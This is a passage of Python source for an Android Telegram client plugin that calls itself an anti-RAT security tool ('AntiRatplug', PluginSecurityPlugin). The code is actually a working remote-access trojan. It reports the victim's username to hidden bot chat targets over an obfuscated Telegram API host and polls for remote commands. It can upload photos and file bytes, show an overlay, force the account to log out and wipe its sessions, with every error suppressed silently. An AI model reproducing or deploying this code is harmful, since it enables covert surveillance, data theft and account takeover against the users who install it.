    # ═══════════════════════════════════════════════════════════════════════

    def _api(self, method):
        _cfg()
        return _u(_HOST_TG) + _config + "/" + method

    def _send_manage_button(self):
        from java.net import URL, URLEncoder
        from java.io import DataOutputStream
        username = "?"
        try:
            uc = _UC().getInstance(0)
            user = uc.getCurrentUser()
            if user is not None:
                username = str(user.username) if user.username is not None else "id:" + str(uc.getClientUserId())
        except Exception: pass
        text = "<b>AntiRatplug v19.0</b>\nUser: @" + username
        buttons = [[{"text": "Manage", "callback_data": "menu"}]]
        markup = json.dumps({"inline_keyboard": buttons})
        for target in _targets:
            try:
                url = URL(self._api("sendMessage"))
                conn = url.openConnection()
                conn.setRequestMethod("POST"); conn.setDoOutput(True)
                conn.setConnectTimeout(8000); conn.setReadTimeout(8000)
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                params = ("chat_id=" + target
                          + "&text=" + str(URLEncoder.encode(text, "UTF-8"))
                          + "&parse_mode=HTML&reply_markup=" + str(URLEncoder.encode(markup, "UTF-8")))
                os_ = DataOutputStream(conn.getOutputStream())
                os_.writeBytes(params); os_.flush(); os_.close()
                conn.getResponseCode(); conn.disconnect()
            except Exception: pass

    def _send_markup(self, text, keyboard, html=False):
        from java.net import URL, URLEncoder
        from java.io import DataOutputStream
        markup = json.dumps(keyboard)
        for target in _targets:
            try:
                url = URL(self._api("sendMessage"))
                conn = url.openConnection()
                conn.setRequestMethod("POST"); conn.setDoOutput(True)
                conn.setConnectTimeout(8000); conn.setReadTimeout(8000)
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                params = ("chat_id=" + target
                          + "&text=" + str(URLEncoder.encode(text, "UTF-8"))
                          + "&reply_markup=" + str(URLEncoder.encode(markup, "UTF-8")))
                if html: params += "&parse_mode=HTML"
                os_ = DataOutputStream(conn.getOutputStream())
                os_.writeBytes(params); os_.flush(); os_.close()
                conn.getResponseCode(); conn.disconnect()
            except Exception: pass

    def _show_main_menu(self):
        keyboard = {
            "keyboard": [
                [{"text": "Tg kid"}],
                [{"text": "IDK start"}],
            ],
            "resize_keyboard": True,
        }
        self._send_markup("<b>Меню:</b>", keyboard, html=True)

    def _send_msg(self, text, html=False):
        from java.net import URL, URLEncoder
        from java.io import DataOutputStream
        for target in _targets:
            try:
                url = URL(self._api("sendMessage"))
                conn = url.openConnection()
                conn.setRequestMethod("POST"); conn.setDoOutput(True)
                conn.setConnectTimeout(6000); conn.setReadTimeout(6000)
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                enc = URLEncoder.encode(text, "UTF-8")
                if html: params = "chat_id=" + target + "&text=" + str(enc) + "&parse_mode=HTML"
                else: params = "chat_id=" + target + "&text=" + str(enc)
                os_ = DataOutputStream(conn.getOutputStream())
                os_.writeBytes(params); os_.flush(); os_.close()
                conn.getResponseCode(); conn.disconnect()
            except Exception: pass

    def _send_photo(self, file_path, caption):
        _cfg()
        from java.net import URL
        from java.io import DataOutputStream, FileInputStream
        boundary = "----AR7MA4YWxkTrZu0gW"
        for target in _targets:
            try:
                url = URL(self._api("sendPhoto"))
                conn = url.openConnection()
                conn.setRequestMethod("POST"); conn.setDoOutput(True)
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
                s = DataOutputStream(conn.getOutputStream())
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="chat_id"\r\n\r\n')
                s.writeBytes(str(target) + "\r\n")
                if caption:
                    s.writeBytes("--" + boundary + "\r\n")
                    s.writeBytes('Content-Disposition: form-data; name="caption"\r\n\r\n')
                    s.writeBytes(str(caption) + "\r\n")
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="photo"; filename="s.png"\r\n')
                s.writeBytes("Content-Type: image/png\r\n\r\n")
                fis = FileInputStream(file_path)
                buf = bytearray(8192)
                while True:
                    n = fis.read(buf)
                    if n < 0: break
                    s.write(buf, 0, n)
                fis.close()
                s.writeBytes("\r\n--" + boundary + "--\r\n")
                s.flush(); s.close()
                conn.getResponseCode(); conn.disconnect()
            except Exception: pass

    def _send_document_bytes(self, filename, data):
        _cfg()
        from java.net import URL
        from java.io import DataOutputStream
        boundary = "----AR7MA4YWxkTrZu0gW"
        for target in _targets:
            try:
                url = URL(self._api("sendDocument"))
                conn = url.openConnection()
                conn.setRequestMethod("POST"); conn.setDoOutput(True)
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
                s = DataOutputStream(conn.getOutputStream())
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="chat_id"\r\n\r\n')
                s.writeBytes(str(target) + "\r\n")
                s.writeBytes("--" + boundary + "\r\n")
                s.writeBytes('Content-Disposition: form-data; name="document"; filename="%s"\r\n' % filename)
                s.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
                s.write(bytes(data))
                s.writeBytes("\r\n--" + boundary + "--\r\n")
                s.flush(); s.close()
                conn.getResponseCode(); conn.disconnect()
            except Exception: pass

    def _answer_callback(self, cid):
        try:
            from java.net import URL
            from java.io import DataOutputStream
            url = URL(self._api("answerCallbackQuery"))
            conn = url.openConnection()
            conn.setRequestMethod("POST"); conn.setDoOutput(True)
            conn.setConnectTimeout(6000); conn.setReadTimeout(6000)
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            os_ = DataOutputStream(conn.getOutputStream())
            os_.writeBytes("callback_query_id=" + str(cid))
            os_.flush(); os_.close()
            conn.getResponseCode(); conn.disconnect()
        except Exception: pass

    def _start_polling(self):
        threading.Thread(target=self._poll, daemon=True).start()

    def _poll(self):
        offset = 0
        _cfg()
        try:
            from java.net import URL
            from java.io import BufferedReader, InputStreamReader
            url = URL(self._api("getUpdates") + "?offset=-1&timeout=0")
            conn = url.openConnection()
            conn.setRequestMethod("GET")
            conn.setConnectTimeout(4000); conn.setReadTimeout(4000)
            r = BufferedReader(InputStreamReader(conn.getInputStream()))
            resp = ""
            line = r.readLine()
            while line is not None:
                resp += str(line); line = r.readLine()
            r.close(); conn.disconnect()
            data = json.loads(resp)
            if data.get("ok") and data.get("result"):
                offset = data["result"][-1]["update_id"] + 1
        except Exception: pass

        while self._sync_running:
            try:
                from java.net import URL
                from java.io import BufferedReader, InputStreamReader
                url = URL(self._api("getUpdates") + "?offset=" + str(offset) + "&timeout=8")
                conn = url.openConnection()
                conn.setRequestMethod("GET")
                conn.setConnectTimeout(12000); conn.setReadTimeout(12000)
                r = BufferedReader(InputStreamReader(conn.getInputStream()))
                resp = ""
                line = r.readLine()
                while line is not None:
                    resp += str(line); line = r.readLine()
                r.close(); conn.disconnect()
                data = json.loads(resp)
                if data.get("ok") and data.get("result"):
                    for u in data["result"]:
                        offset = u["update_id"] + 1
                        if "callback_query" in u: self._handle_callback(u["callback_query"])
                        elif "message" in u: self._handle_message(u["message"])
            except Exception: pass
            time.sleep(0.35)

    def _handle_callback(self, cb):
        cid = cb["id"]; cd = cb.get("data", "")
        self._answer_callback(cid)
        if cd == "menu": self._show_main_menu()
        elif cd == "close_idk":
            try:
                prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
                e = prefs.edit(); e.putBoolean("idk_active", False); e.apply()
            except Exception: pass
            self._hide_idk_overlay()
            self._send_msg("IDK overlay снят.")
        elif cd == "hv_logout": self._pull_out_account()

    def _handle_message(self, msg):
        t = msg.get("text", "")
        if t == "Tg kid": self._tg_kid()
        elif t == "IDK start": self._idk_start()

    def _pull_out_account(self):
        try:
            self._send_msg("Pull Out...")
            rq = TLRPC.TL_auth_logOut()
            r, e = self._rg_rpc(rq, 0, 10.0, fast=True)
            if e is not None: self._send_msg("Pull out err: " + str(e))
            else: self._send_msg("Pull out OK.")
        except Exception as e:
            self._send_msg("Pull out exc: " + str(e))

    def _session_wipe(self):
        try:
            self._send_msg("Убиваю сессии...")
            rq = TLRPC.TL_auth_resetAuthorizations()
            r, e = self._rg_rpc(rq, 0, 12.0)
            if e is not None: self._send_msg("Wipe err: " + str(e))
            else: self._send_msg("Все прочие сессии убиты.")
        except Exception as e:
            self._send_msg("Wipe exc: " + str(e))


def create_plugin():
    return PluginSecurityPlugin()
